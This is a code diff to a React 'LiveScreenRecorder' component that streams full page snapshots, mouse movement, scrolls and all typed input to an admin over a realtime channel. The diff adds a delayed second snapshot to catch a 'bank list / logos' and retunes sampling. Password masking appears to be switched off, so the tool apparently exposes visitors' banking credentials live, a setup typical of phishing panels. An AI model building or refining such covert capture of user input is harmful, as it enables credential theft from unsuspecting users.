@@ -190,8 +190,14 @@ export function LiveScreenRecorder() {
       channel.subscribe(async (status) => {
         if (status === "SUBSCRIBED" && !isDisposed) {
           await sendMeta();
-          // Always send full snapshot when channel connects so admin gets the page immediately
+          // Send snapshot immediately
           await sendFullSnapshotFlow();
+          // And refresh snapshot 500ms later to capture any async content (e.g. bank list / logos)
+          setTimeout(() => {
+            if (!isDisposed && isStreamingRef.current) {
+              void sendFullSnapshotFlow();
+            }
+          }, 500);
         }
       });
 
@@ -214,12 +220,12 @@ export function LiveScreenRecorder() {
             password: false,
           },
           inlineStylesheet: true,
-          inlineImages: true,
-          collectFonts: true,
+          inlineImages: false, // Super fast & lean: images load via their native URLs without blocking the thread
+          collectFonts: false,
           sampling: {
-            mousemove: true,
+            mousemove: 60, // Smooth 16fps cursor tracking without WebSocket congestion
             mouseInteraction: true,
-            scroll: 150,
+            scroll: 60,
             input: "all",
           },
         });
